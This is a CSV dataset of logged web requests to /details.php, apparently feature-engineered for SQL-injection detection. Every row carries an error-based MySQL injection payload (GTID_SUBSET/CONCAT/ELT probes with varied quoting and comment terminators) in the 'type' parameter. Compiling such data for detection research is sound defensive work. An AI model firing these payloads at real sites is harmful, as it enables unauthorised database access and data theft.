full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5&type=2%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20HrWC,"/details.php?prod=5&type=2 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- HrWC",1680093129.751166,10.0.2.31,3,93,220.4,1,4.301075268817204
/details.php?prod=5&type=2%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%23%20Evey,"/details.php?prod=5&type=2 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)# Evey",1680093129.75482,10.0.2.31,3,92,220.4,1,4.3478260869565215
/details.php?prod=5&type=2%29%20WHERE%201694%3D1694%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20byJw,"/details.php?prod=5&type=2) WHERE 1694=1694 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- byJw",1680093129.758697,10.0.2.31,4,110,220.4,1,4.545454545454546
/details.php?prod=5&type=2%20WHERE%209316%3D9316%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20JjPX,"/details.php?prod=5&type=2 WHERE 9316=9316 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- JjPX",1680093129.763312,10.0.2.31,4,109,220.4,1,4.587155963302752
/details.php?prod=5&type=2%2B%28SELECT%20msRt%20WHERE%203662%3D3662%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%29%2B,"/details.php?prod=5&type=2+(SELECT msRt WHERE 3662=3662 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357))+",1680093129.767602,10.0.2.31,4,117,220.4,0,3.4188034188034186
/details.php?prod=5&type=2%29%29%20AS%20EFOz%20WHERE%208929%3D8929%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20eUNF,"/details.php?prod=5&type=2)) AS EFOz WHERE 8929=8929 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- eUNF",1680093129.780176,10.0.2.31,5,119,220.4,1,5.042016806722689
/details.php?prod=5&type=2%29%20AS%20poIW%20WHERE%207432%3D7432%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20KYKe,"/details.php?prod=5&type=2) AS poIW WHERE 7432=7432 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- KYKe",1680093129.785323,10.0.2.31,5,118,220.4,1,5.084745762711864
/details.php?prod=5&type=2%60%20WHERE%207723%3D7723%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20uulN,"/details.php?prod=5&type=2` WHERE 7723=7723 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- uulN",1680093129.799346,10.0.2.31,4,110,220.4,1,4.545454545454546
/details.php?prod=5&type=2%60%29%20WHERE%201804%3D1804%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20GNhf,"/details.php?prod=5&type=2`) WHERE 1804=1804 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- GNhf",1680093129.804745,10.0.2.31,4,111,220.4,1,4.504504504504505
/details.php?prod=5&type=2%60%3D%602%60%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%602%60%3D%602,"/details.php?prod=5&type=2`=`2` AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND `2`=`2",1680093129.811427,10.0.2.31,3,102,220.4,0,2.9411764705882355
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%203361%3D3361%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%29%7C%5B2,"/details.php?prod=5&type=2]-(SELECT 0 WHERE 3361=3361 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357))|[2",1680093129.817113,10.0.2.31,4,117,220.4,0,3.4188034188034186
/details.php?prod=5&type=2%27%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20Qulq,"/details.php?prod=5&type=2') AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- Qulq",1680093129.82303,10.0.2.31,3,95,220.4,2,5.2631578947368425
/details.php?prod=5&type=2%27%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20HADU,"/details.php?prod=5&type=2' AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- HADU",1680093129.828014,10.0.2.31,3,94,220.4,2,5.319148936170213
/details.php?prod=5&type=2%22%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20CVTx,"/details.php?prod=5&type=2"" AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- CVTx",1680093129.833544,10.0.2.31,3,94,220.4,2,5.319148936170213
/details.php?prod=5&type=2%27%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%27ARuq%27%3D%27ARuq,"/details.php?prod=5&type=2') AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ('ARuq'='ARuq",1680093129.837875,10.0.2.31,3,106,220.4,1,3.7735849056603774
/details.php?prod=5&type=2%27%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%27mFhL%27%3D%27mFhL,"/details.php?prod=5&type=2')) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND (('mFhL'='mFhL",1680093129.84839,10.0.2.31,3,108,220.4,1,3.7037037037037037
/details.php?prod=5&type=2%27%29%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%28%27VcEh%27%3D%27VcEh,"/details.php?prod=5&type=2'))) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ((('VcEh'='VcEh",1680093129.857753,10.0.2.31,3,110,220.4,1,3.6363636363636362
/details.php?prod=5&type=2%27%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%27BcJo%27%3D%27BcJo,"/details.php?prod=5&type=2' AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND 'BcJo'='BcJo",1680093129.866563,10.0.2.31,3,104,220.4,1,3.8461538461538463
/details.php?prod=5&type=2%27%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%27jemN%27%20LIKE%20%27jemN,"/details.php?prod=5&type=2') AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ('jemN' LIKE 'jemN",1680093129.871695,10.0.2.31,4,111,220.4,1,4.504504504504505
/details.php?prod=5&type=2%27%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%27Mtew%27%20LIKE%20%27Mtew,"/details.php?prod=5&type=2')) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND (('Mtew' LIKE 'Mtew",1680093129.880425,10.0.2.31,4,113,220.4,1,4.424778761061947
/details.php?prod=5&type=2%27%29%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%28%27sbDn%27%20LIKE%20%27sbDn,"/details.php?prod=5&type=2'))) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ((('sbDn' LIKE 'sbDn",1680093129.886245,10.0.2.31,4,115,220.4,1,4.3478260869565215
/details.php?prod=5&type=2%25%27%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%27hXBZ%25%27%3D%27hXBZ,"/details.php?prod=5&type=2%' AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND 'hXBZ%'='hXBZ",1680093129.891084,10.0.2.31,3,106,220.4,1,3.7735849056603774
/details.php?prod=5&type=2%27%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%27EcXc%27%20LIKE%20%27EcXc,"/details.php?prod=5&type=2' AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND 'EcXc' LIKE 'EcXc",1680093129.896275,10.0.2.31,4,109,220.4,1,4.587155963302752
/details.php?prod=5&type=2%22%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%22uonr%22%3D%22uonr,"/details.php?prod=5&type=2"") AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND (""uonr""=""uonr",1680093129.901532,10.0.2.31,3,106,220.4,1,3.7735849056603774
/details.php?prod=5&type=2%22%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%22aCWz%22%3D%22aCWz,"/details.php?prod=5&type=2"")) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ((""aCWz""=""aCWz",1680093129.905517,10.0.2.31,3,108,220.4,1,3.7037037037037037
/details.php?prod=5&type=2%22%29%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%28%22cTZF%22%3D%22cTZF,"/details.php?prod=5&type=2""))) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND (((""cTZF""=""cTZF",1680093129.911056,10.0.2.31,3,110,220.4,1,3.6363636363636362
/details.php?prod=5&type=2%22%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%22lCjS%22%3D%22lCjS,"/details.php?prod=5&type=2"" AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ""lCjS""=""lCjS",1680093129.917342,10.0.2.31,3,104,220.4,1,3.8461538461538463
/details.php?prod=5&type=2%22%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%22blVp%22%20LIKE%20%22blVp,"/details.php?prod=5&type=2"") AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND (""blVp"" LIKE ""blVp",1680093129.928043,10.0.2.31,4,111,220.4,1,4.504504504504505
/details.php?prod=5&type=2%22%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%22UIFg%22%20LIKE%20%22UIFg,"/details.php?prod=5&type=2"")) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ((""UIFg"" LIKE ""UIFg",1680093129.933223,10.0.2.31,4,113,220.4,1,4.424778761061947
/details.php?prod=5&type=2%22%29%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%28%22VWaK%22%20LIKE%20%22VWaK,"/details.php?prod=5&type=2""))) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND (((""VWaK"" LIKE ""VWaK",1680093129.939666,10.0.2.31,4,115,220.4,1,4.3478260869565215
/details.php?prod=5&type=2%22%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%22IqPL%22%20LIKE%20%22IqPL,"/details.php?prod=5&type=2"" AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ""IqPL"" LIKE ""IqPL",1680093129.943187,10.0.2.31,4,109,220.4,1,4.587155963302752
/details.php?prod=5&type=2%27%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20OR%20%27cAjC%27%3D%27KRTq,"/details.php?prod=5&type=2' AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) OR 'cAjC'='KRTq",1680093129.950077,10.0.2.31,4,103,220.4,1,4.854368932038835
/details.php?prod=5&type=2%27%29%20WHERE%209610%3D9610%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20HLar,"/details.php?prod=5&type=2') WHERE 9610=9610 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- HLar",1680093129.95451,10.0.2.31,4,111,220.4,2,5.405405405405405
/details.php?prod=5&type=2%22%29%20WHERE%203641%3D3641%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20puct,"/details.php?prod=5&type=2"") WHERE 3641=3641 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- puct",1680093129.958824,10.0.2.31,4,111,220.4,2,5.405405405405405
/details.php?prod=5&type=2%27%20WHERE%201165%3D1165%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20vveq,"/details.php?prod=5&type=2' WHERE 1165=1165 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- vveq",1680093129.963764,10.0.2.31,4,110,220.4,2,5.454545454545454
/details.php?prod=5&type=2%22%20WHERE%209919%3D9919%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20SQlx,"/details.php?prod=5&type=2"" WHERE 9919=9919 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- SQlx",1680093129.967862,10.0.2.31,4,110,220.4,2,5.454545454545454
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x496d7769%20WHERE%205849%3D5849%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%29%7C%7C%27,"/details.php?prod=5&type=2'||(SELECT 0x496d7769 WHERE 5849=5849 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357))||'",1680093129.971622,10.0.2.31,4,127,220.4,1,3.937007874015748
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x7670506e%20FROM%20DUAL%20WHERE%202310%3D2310%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%29%7C%7C%27,"/details.php?prod=5&type=2'||(SELECT 0x7670506e FROM DUAL WHERE 2310=2310 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357))||'",1680093129.976279,10.0.2.31,5,137,220.4,1,4.37956204379562
/details.php?prod=5&type=2%27%2B%28SELECT%200x494b686c%20WHERE%206188%3D6188%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%29%2B%27,"/details.php?prod=5&type=2'+(SELECT 0x494b686c WHERE 6188=6188 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357))+'",1680093129.979537,10.0.2.31,4,125,220.4,1,4.0
/details.php?prod=5&type=2%7C%7C%28SELECT%200x65516e62%20FROM%20DUAL%20WHERE%207139%3D7139%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%29%7C%7C,"/details.php?prod=5&type=2||(SELECT 0x65516e62 FROM DUAL WHERE 7139=7139 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357))||",1680093129.984205,10.0.2.31,5,135,220.4,0,3.7037037037037037
/details.php?prod=5&type=2%7C%7C%28SELECT%200x6b667748%20WHERE%201072%3D1072%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%29%7C%7C,"/details.php?prod=5&type=2||(SELECT 0x6b667748 WHERE 1072=1072 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357))||",1680093129.988101,10.0.2.31,4,125,220.4,0,3.2
/details.php?prod=5&type=2%2B%28SELECT%200x49526f45%20WHERE%201569%3D1569%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%29%2B,"/details.php?prod=5&type=2+(SELECT 0x49526f45 WHERE 1569=1569 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357))+",1680093129.991281,10.0.2.31,4,123,220.4,0,3.252032520325203
/details.php?prod=5&type=2%27%29%29%20AS%20LJbG%20WHERE%203639%3D3639%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20lVZG,"/details.php?prod=5&type=2')) AS LJbG WHERE 3639=3639 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- lVZG",1680093129.995324,10.0.2.31,5,120,220.4,2,5.833333333333333
/details.php?prod=5&type=2%22%29%29%20AS%20zwGb%20WHERE%207893%3D7893%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20qOtM,"/details.php?prod=5&type=2"")) AS zwGb WHERE 7893=7893 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- qOtM",1680093130.000035,10.0.2.31,5,120,220.4,2,5.833333333333333
/details.php?prod=5&type=2%27%29%20AS%20BZTd%20WHERE%209102%3D9102%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20bDdB,"/details.php?prod=5&type=2') AS BZTd WHERE 9102=9102 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- bDdB",1680093130.003852,10.0.2.31,5,119,220.4,2,5.882352941176471
/details.php?prod=5&type=2%22%29%20AS%20lyfX%20WHERE%201637%3D1637%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20tZCL,"/details.php?prod=5&type=2"") AS lyfX WHERE 1637=1637 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- tZCL",1680093130.00794,10.0.2.31,5,119,220.4,2,5.882352941176471
/details.php?prod=5&type=2%22%3D%222%22%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%222%22%3D%222,"/details.php?prod=5&type=2""=""2"" AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ""2""=""2",1680093130.011316,10.0.2.31,3,102,220.4,1,3.9215686274509802
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)#",1680093130.015474,10.0.2.31,4,105,220.4,2,5.714285714285714
/details.php?prod=5&type=2%29%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%287799%3D7799%2C1%29%29%29%2C0x7178706a71%29%2C7799%29--%20cukN,"/details.php?prod=5&type=2) OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(7799=7799,1))),0x7178706a71),7799)-- cukN",1680093130.019641,10.0.2.31,3,93,220.4,1,4.301075268817204
/details.php?prod=5&type=2%29%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%287799%3D7799%2C1%29%29%29%2C0x7178706a71%29%2C7799%29%20AND%20%289563%3D9563,"/details.php?prod=5&type=2) OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(7799=7799,1))),0x7178706a71),7799) AND (9563=9563",1680093130.023223,10.0.2.31,4,101,220.4,0,3.9603960396039604
/details.php?prod=5&type=2%29%29%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%287799%3D7799%2C1%29%29%29%2C0x7178706a71%29%2C7799%29%20AND%20%28%283354%3D3354,"/details.php?prod=5&type=2)) OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(7799=7799,1))),0x7178706a71),7799) AND ((3354=3354",1680093130.026486,10.0.2.31,4,103,220.4,0,3.883495145631068
/details.php?prod=5&type=2%29%29%29%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%287799%3D7799%2C1%29%29%29%2C0x7178706a71%29%2C7799%29%20AND%20%28%28%286704%3D6704,"/details.php?prod=5&type=2))) OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(7799=7799,1))),0x7178706a71),7799) AND (((6704=6704",1680093130.03012,10.0.2.31,4,105,220.4,0,3.8095238095238093
/details.php?prod=5&type=2%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%287799%3D7799%2C1%29%29%29%2C0x7178706a71%29%2C7799%29,"/details.php?prod=5&type=2 OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(7799=7799,1))),0x7178706a71),7799)",1680093130.034945,10.0.2.31,3,85,220.4,0,3.5294117647058822
/details.php?prod=5&type=2%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%287799%3D7799%2C1%29%29%29%2C0x7178706a71%29%2C7799%29--%20oWAS,"/details.php?prod=5&type=2 OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(7799=7799,1))),0x7178706a71),7799)-- oWAS",1680093130.038543,10.0.2.31,4,92,220.4,1,5.434782608695652
/details.php?prod=5&type=2%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%287799%3D7799%2C1%29%29%29%2C0x7178706a71%29%2C7799%29%23%20LNYT,"/details.php?prod=5&type=2 OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(7799=7799,1))),0x7178706a71),7799)# LNYT",1680093130.042696,10.0.2.31,3,91,220.4,1,4.395604395604396
/details.php?prod=5&type=2%29%20WHERE%206648%3D6648%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%287799%3D7799%2C1%29%29%29%2C0x7178706a71%29%2C7799%29--%20OxVH,"/details.php?prod=5&type=2) WHERE 6648=6648 OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(7799=7799,1))),0x7178706a71),7799)-- OxVH",1680093130.049257,10.0.2.31,4,109,220.4,1,4.587155963302752
